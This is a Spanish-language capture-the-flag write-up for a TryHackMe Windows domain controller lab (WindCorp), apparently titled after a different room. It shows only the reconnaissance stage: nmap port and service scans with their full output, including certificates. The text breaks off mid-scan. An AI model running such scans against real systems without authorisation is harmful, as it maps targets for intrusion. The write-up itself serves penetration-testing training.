## TryHackMe  <> Year of the Owl

![image](https://github.com/Esevka/CTF/assets/139042999/ca6e2244-bb5a-4fb4-ad4a-c543249c58a3)

Enlace Maquina: https://tryhackme.com/room/ra

Enunciado : 

  - You have gained access to the internal network of WindCorp
  - Next step would be to take their crown jewels and get full access to their internal network. You have spotted a new windows machine
  - Conseguir 3 Flags

## Escaneo de puertos NMAP

-Buscamos puertos abiertos en en la maquina victima.

    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/ra1.1/nmap]
    └─# nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.36.177 -vvv -oG open_ports
    Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-05 16:27 CEST
    
    PORT      STATE SERVICE          REASON
    53/tcp    open  domain           syn-ack ttl 127
    80/tcp    open  http             syn-ack ttl 127
    88/tcp    open  kerberos-sec     syn-ack ttl 127
    135/tcp   open  msrpc            syn-ack ttl 127
    139/tcp   open  netbios-ssn      syn-ack ttl 127
    389/tcp   open  ldap             syn-ack ttl 127
    445/tcp   open  microsoft-ds     syn-ack ttl 127
    464/tcp   open  kpasswd5         syn-ack ttl 127
    593/tcp   open  http-rpc-epmap   syn-ack ttl 127
    636/tcp   open  ldapssl          syn-ack ttl 127
    2179/tcp  open  vmrdp            syn-ack ttl 127
    3268/tcp  open  globalcatLDAP    syn-ack ttl 127
    3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
    3389/tcp  open  ms-wbt-server    syn-ack ttl 127
    5222/tcp  open  xmpp-client      syn-ack ttl 127
    5223/tcp  open  hpvirtgrp        syn-ack ttl 127
    5229/tcp  open  jaxflow          syn-ack ttl 127
    5262/tcp  open  unknown          syn-ack ttl 127
    5263/tcp  open  unknown          syn-ack ttl 127
    5269/tcp  open  xmpp-server      syn-ack ttl 127
    5270/tcp  open  xmp              syn-ack ttl 127
    5275/tcp  open  unknown          syn-ack ttl 127
    5276/tcp  open  unknown          syn-ack ttl 127
    5985/tcp  open  wsman            syn-ack ttl 127
    7070/tcp  open  realserver       syn-ack ttl 127
    7443/tcp  open  oracleas-https   syn-ack ttl 127
    7777/tcp  open  cbt              syn-ack ttl 127
    9090/tcp  open  zeus-admin       syn-ack ttl 127
    9091/tcp  open  xmltec-xmlmail   syn-ack ttl 127
    9389/tcp  open  adws             syn-ack ttl 127
    49668/tcp open  unknown          syn-ack ttl 127
    49669/tcp open  unknown          syn-ack ttl 127
    49672/tcp open  unknown          syn-ack ttl 127
    49673/tcp open  unknown          syn-ack ttl 127
    49695/tcp open  unknown          syn-ack ttl 127
    49927/tcp open  unknown          syn-ack ttl 127
    
-Esta captura la hemos exportado en formato grepable,por lo que vamos a extraer los puertos para lanzarles unos scripts basicos de reconocimiento.

    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/ra1.1/nmap]
    └─# list_port open_ports 
    
    [+]Puertos Disponibles --> (Copiados en el Clipboard)
    
    53,80,88,135,139,389,445,464,593,636,2179,3268,3269,3389,5222,5223,5229,5262,5263,5269,5270,5275,5276,5985,7070,7443,7777,9090,9091,9389,49668,49669,49672,49673,49695,49927

  Ya tenemos los puertos copiado en el Clipboard, un script simple pero de gran ayuda. Script-->  https://github.com/Esevka/CTF/tree/main/Bash

-Lanzamos scripts basicos de reconocimiento sobre los puertos abiertos.

    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/ra1.1/nmap]
    └─# nmap -p 53,80,88,135,139,389,445,464,593,636,2179,3268,3269,3389,5222,5223,5229,5262,5263,5269,5270,5275,5276,5985,7070,7443,7777,9090,9091,9389,49668,49669,49672,49673,49695,49927 -sCV -n -Pn 10.10.36.177 -vvv -oN info_ports
    
    Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-05 16:36 CEST
    
    PORT      STATE SERVICE             REASON          VERSION
    
    53/tcp    open  domain              syn-ack ttl 127 Simple DNS Plus
    
    80/tcp    open  http                syn-ack ttl 127 Microsoft IIS httpd 10.0
    |_http-title: Windcorp.
    | http-methods: 
    |   Supported Methods: OPTIONS TRACE GET HEAD POST
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/10.0
    
    88/tcp    open  kerberos-sec        syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2023-10-05 14:36:59Z)
    135/tcp   open  msrpc               syn-ack ttl 127 Microsoft Windows RPC
    139/tcp   open  netbios-ssn         syn-ack ttl 127 Microsoft Windows netbios-ssn
    389/tcp   open  ldap                syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
    445/tcp   open  microsoft-ds?       syn-ack ttl 127
    464/tcp   open  kpasswd5?           syn-ack ttl 127
    593/tcp   open  ncacn_http          syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  ldapssl?            syn-ack ttl 127
    2179/tcp  open  vmrdp?              syn-ack ttl 127
    3268/tcp  open  ldap                syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
    3269/tcp  open  globalcatLDAPssl?   syn-ack ttl 127
    
    3389/tcp  open  ms-wbt-server       syn-ack ttl 127 Microsoft Terminal Services
    |_ssl-date: 2023-10-05T14:38:46+00:00; +1s from scanner time.
    | rdp-ntlm-info: 
    |   Target_Name: WINDCORP
    |   NetBIOS_Domain_Name: WINDCORP
    |   NetBIOS_Computer_Name: FIRE
    |   DNS_Domain_Name: windcorp.thm
    |   DNS_Computer_Name: Fire.windcorp.thm
    |   DNS_Tree_Name: windcorp.thm
    |   Product_Version: 10.0.17763
    |_  System_Time: 2023-10-05T14:38:06+00:00
    | ssl-cert: Subject: commonName=Fire.windcorp.thm
    | Issuer: commonName=Fire.windcorp.thm
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2023-10-04T14:20:06
    | Not valid after:  2024-04-04T14:20:06
    | MD5:   2dcd:6a16:d7ba:124d:a65e:1c8f:f5da:8542
    | SHA-1: 7074:af72:252e:f5c7:b00a:1172:b51a:f8a9:997b:008f
    | -----BEGIN CERTIFICATE-----
    | MIIC5jCCAc6gAwIBAgIQb1ZLGoaWtYdKSGc75mCbXTANBgkqhkiG9w0BAQsFADAc
    | MRowGAYDVQQDExFGaXJlLndpbmRjb3JwLnRobTAeFw0yMzEwMDQxNDIwMDZaFw0y
    | NDA0MDQxNDIwMDZaMBwxGjAYBgNVBAMTEUZpcmUud2luZGNvcnAudGhtMIIBIjAN
    | BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA37VeTrSXCWG3rYrpxyqi9VRGioHP
    | VqFEowYVJvyj+JS+8R5WXAyKT3ha+NXib4P1y20sNls4wpTNO2DQjlfUE2ojT76H
    | d7uXP09RGs+D7OIfqJXi/OrsPW5DlFGHVU6OV54A2oZ4nupaBTrt7EhB7+wMB6pz
    | s8/BrXbP+ocdkUrFFwIe6KMmnIfzus+LLemUZxMaNUN7iUBTZ9EvzrgKBi1hr+/C
    | BioM8bdgG2F5VQwecZeJhH0b7uATYv91wtCAQiATjI++6Pf9bdH+gdBxWqYghYnl
    | bUL5HujmkLGvZv87Jx7YDjSILsk4jYtdChn6Rbbujco+90arOFh9ynpXVQIDAQAB
    | oyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcN
    | AQELBQADggEBANlgxLhTOotXYnapVbbzWyWLqAtKqI5TCfyQ8QJODfB+vsyLQSQr
    | mrW3MIFBLGhiSUDEFGEbQPrGPR5d9BBa7KBF5xZjGGqsfIbmH2NUHZffk1+xhIhE
    | 7YnfO+Z6Dfuoiw/Tz1YcfI9N1T736npglhrkON5SVhe31HrBi3NZJz0T2/xp1rtm
    | zbf5bP6QuTrpeZtpFNkUeDMtRsflV4LhBYo2CnmCgfNVH4NJXdza3Pjf1obIRoj3
    | 6sLnAi0JIfHn/n//SZv6L4Pst9FS+1+5a6nyIOxbRKCcHP7sgmnOiF69PXS4DqvC
    | M7XhZKTRvPf8nBGTcU+9j24pLtiOEXwSd9Q=
    |_-----END CERTIFICATE-----
    
    5222/tcp  open  jabber              syn-ack ttl 127
    |_ssl-date: 2023-10-05T14:38:47+00:00; +1s from scanner time.
    | xmpp-info: 
    |   STARTTLS Failed
    |   info: 
    |     stream_id: 9fq6orakaa
    |     features: 
    |     compression_methods: 
    |     capabilities: 
    |     xmpp: 
    |       version: 1.0
    |     unknown: 
    |     auth_mechanisms: 
    |     errors: 
    |       invalid-namespace
    |_      (timeout)
    | fingerprint-strings: 
    |   RPCCheck: 
    |_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
    | ssl-cert: Subject: commonName=fire.windcorp.thm
    | Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
    | Issuer: commonName=fire.windcorp.thm
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2020-05-01T08:39:00
    | Not valid after:  2025-04-30T08:39:00
    | MD5:   b715:5425:83f3:a20f:75c8:ca2d:3353:cbb7
    | SHA-1: 97f7:0772:a26b:e324:7ed5:bbcb:5f35:7d74:7982:66ae
    | -----BEGIN CERTIFICATE-----
    | MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
    | AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
    | OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
    | AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
    | /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
    | IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
    | X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
    | DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
    | UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
    | VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
    | HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
    | sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
    | 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
    | II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
    | n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
    | +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
    | v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
    | LucP
    |_-----END CERTIFICATE-----
    
    5223/tcp  open  ssl/jabber          syn-ack ttl 127
    |_ssl-date: 2023-10-05T14:38:46+00:00; +1s from scanner time.
    | xmpp-info: 
    |   STARTTLS Failed
    |   info: 
    |     features: 
    |     compression_methods: 
    |     capabilities: 
    |     xmpp: 
    |     unknown: 
    |     auth_mechanisms: 
    |     errors: 
    |_      (timeout)
    | ssl-cert: Subject: commonName=fire.windcorp.thm
    | Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
    | Issuer: commonName=fire.windcorp.thm
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2020-05-01T08:39:00
    | Not valid after:  2025-04-30T08:39:00
    | MD5:   b715:5425:83f3:a20f:75c8:ca2d:3353:cbb7
    | SHA-1: 97f7:0772:a26b:e324:7ed5:bbcb:5f35:7d74:7982:66ae
    | -----BEGIN CERTIFICATE-----
    | MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
    | AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
    | OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
    | AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
    | /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
    | IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
    | X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
    | DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
    | UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
    | VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
    | HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
    | sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
    | 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
    | II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
    | n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
    | +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
    | v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
    | LucP
    |_-----END CERTIFICATE-----
    | fingerprint-strings: 
    |   RPCCheck: 
    |_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
    
    5229/tcp  open  jaxflow?            syn-ack ttl 127
    
    5262/tcp  open  jabber              syn-ack ttl 127
    | xmpp-info: 
    |   STARTTLS Failed
    |   info: 
    |     stream_id: a0j6xx9703
    |     features: 
    |     compression_methods: 
    |     capabilities: 
    |     xmpp: 
    |       version: 1.0
    |     unknown: 
    |     auth_mechanisms: 
    |     errors: 
    |       invalid-namespace
    |_      (timeout)
    | fingerprint-strings: 
    |   RPCCheck: 
    |_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
    
    5263/tcp  open  ssl/jabber          syn-ack ttl 127 Ignite Realtime Openfire Jabber server 3.10.0 or later
    |_ssl-date: 2023-10-05T14:38:46+00:00; +1s from scanner time.
    | xmpp-info: 
    |   STARTTLS Failed
    |   info: 
    |     features: 
    |     compression_methods: 
    |     capabilities: 
    |     xmpp: 
    |     unknown: 
    |     auth_mechanisms: 
    |     errors: 
    |_      (timeout)
    | ssl-cert: Subject: commonName=fire.windcorp.thm
    | Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
    | Issuer: commonName=fire.windcorp.thm
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2020-05-01T08:39:00
    | Not valid after:  2025-04-30T08:39:00
    | MD5:   b715:5425:83f3:a20f:75c8:ca2d:3353:cbb7
    | SHA-1: 97f7:0772:a26b:e324:7ed5:bbcb:5f35:7d74:7982:66ae
    | -----BEGIN CERTIFICATE-----
    | MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
    | AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
    | OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
    | AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
    | /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
    | IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
    | X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
    | DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
    | UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
    | VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
    | HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
    | sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
    | 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
    | II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
    | n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
    | +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
    | v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
    | LucP
    |_-----END CERTIFICATE-----
    
    5269/tcp  open  xmpp                syn-ack ttl 127 Wildfire XMPP Client
    | xmpp-info: 
    |   STARTTLS Failed
    |   info: 
    |     features: 
    |     compression_methods: 
    |     capabilities: 
    |     xmpp: 
    |     unknown: 
    |     auth_mechanisms: 
    |     errors: 
    |_      (timeout)
    
    5270/tcp  open  ssl/xmpp            syn-ack ttl 127 Wildfire XMPP Client
    |_ssl-date: 2023-10-05T14:38:46+00:00; +1s from scanner time.
    | ssl-cert: Subject: commonName=fire.windcorp.thm
    | Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
    | Issuer: commonName=fire.windcorp.thm
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2020-05-01T08:39:00
    | Not valid after:  2025-04-30T08:39:00
    | MD5:   b715:5425:83f3:a20f:75c8:ca2d:3353:cbb7
    | SHA-1: 97f7:0772:a26b:e324:7ed5:bbcb:5f35:7d74:7982:66ae
    | -----BEGIN CERTIFICATE-----
    | MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
    | AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
    | OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
    | AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
    | /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
    | IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
    | X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
    | DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
    | UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
    | VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
    | HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
    | sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
    | 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
    | II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
    | n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
    | +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
    | v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
    | LucP
    |_-----END CERTIFICATE-----
    
    5275/tcp  open  jabber              syn-ack ttl 127
    | fingerprint-strings: 
    |   RPCCheck: 
    |_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
    | xmpp-info: 
    |   STARTTLS Failed
    |   info: 
    |     stream_id: rv8uc20ny
    |     features: 
    |     compression_methods: 
    |     capabilities: 
    |     xmpp: 
    |       version: 1.0
    |     unknown: 
    |     auth_mechanisms: 
    |     errors: 
    |       invalid-namespace
    |_      (timeout)
    
    5276/tcp  open  ssl/jabber          syn-ack ttl 127
    |_ssl-date: 2023-10-05T14:38:46+00:00; +1s from scanner time.
    | fingerprint-strings: 
    |   RPCCheck: 
    |_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
    | ssl-cert: Subject: commonName=fire.windcorp.thm
    | Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
    | Issuer: commonName=fire.windcorp.thm
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2020-05-01T08:39:00
    | Not valid after:  2025-04-30T08:39:00
    | MD5:   b715:5425:83f3:a20f:75c8:ca2d:3353:cbb7
    | SHA-1: 97f7:0772:a26b:e324:7ed5:bbcb:5f35:7d74:7982:66ae
    | -----BEGIN CERTIFICATE-----
    | MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
    | AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
    | OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
    | AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
    | /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
    | IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
    | X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
    | DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
    | UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
    | VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
    | HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
    | sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
    | 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
    | II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
    | n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
    | +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
    | v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
    | LucP
    |_-----END CERTIFICATE-----
    | xmpp-info: 
    |   STARTTLS Failed
    |   info: 
    |     features: 
    |     compression_methods: 
    |     capabilities: 
    |     xmpp: 
    |     unknown: 
    |     auth_mechanisms: 
    |     errors: 
    |_      (timeout)
    
    5985/tcp  open  http                syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0
    
    7070/tcp  open  http                syn-ack ttl 127 Jetty 9.4.18.v20190429
    |_http-server-header: Jetty(9.4.18.v20190429)
    |_http-title: Openfire HTTP Binding Service
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    
    7443/tcp  open  ssl/http            syn-ack ttl 127 Jetty 9.4.18.v20190429
    |_http-title: Openfire HTTP Binding Service
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    | ssl-cert: Subject: commonName=fire.windcorp.thm
    | Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
    | Issuer: commonName=fire.windcorp.thm
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2020-05-01T08:39:00
    | Not valid after:  2025-04-30T08:39:00
    | MD5:   b715:5425:83f3:a20f:75c8:ca2d:3353:cbb7
    | SHA-1: 97f7:0772:a26b:e324:7ed5:bbcb:5f35:7d74:7982:66ae
    | -----BEGIN CERTIFICATE-----
    | MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
    | AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
    | OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
    | AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
    | /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
    | IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
    | X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
    | DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
    | UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
    | VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
    | HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
    | sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
    | 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
    | II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
    | n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
    | +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
    | v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
    | LucP
    |_-----END CERTIFICATE-----
    |_http-server-header: Jetty(9.4.18.v20190429)
    
    7777/tcp  open  socks5              syn-ack ttl 127 (No authentication; connection not allowed by ruleset)
    | socks-auth-info: 
    |_  No authentication
    
    9090/tcp  open  zeus-admin?         syn-ack ttl 127
    | fingerprint-strings: 
    |   GetRequest: 
    |     HTTP/1.1 200 OK
    |     Date: Thu, 05 Oct 2023 14:37:06 GMT
    |     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
    |     Content-Type: text/html
    |     Accept-Ranges: bytes
    |     Content-Length: 115
    |     <html>
    |     <head><title></title>
    |     <meta http-equiv="refresh" content="0;URL=index.jsp">
    |     </head>
    |     <body>
